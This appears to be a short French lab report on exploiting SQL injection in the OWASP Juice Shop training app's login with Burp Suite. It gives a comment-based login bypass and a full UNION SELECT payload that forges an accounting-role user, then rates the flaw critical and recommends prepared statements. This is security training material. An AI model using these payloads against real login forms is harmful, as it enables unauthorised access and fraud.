## methodology:
# – steps :
1. direction la page login du juiceshop et je récupère depuis le HTTP history le POST. qui ressemble à ça :
-----------------------------------
{
    "email":"acc0unt4nt@juice-sh.op' -- ","password":"zef"
    }
-----------------------------------
2. insertion d'un requete sql avec UNION SELECT : "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--","
# – techniques : 
- SQL injection
# – tool used  :
- burp suit
## vulnerabilities:
# – vulnerability name :
- SQL injection
# – affected components :
- système d'authentification
# – severity level :
- critical
## risks:
# – business impact :
- fraude
## actions:
# – proposesomerisks mitigation strategies :
- utiliser des instructions préparées pour que les entrées utilisateur ne soient jamais interprétées comme du code sql
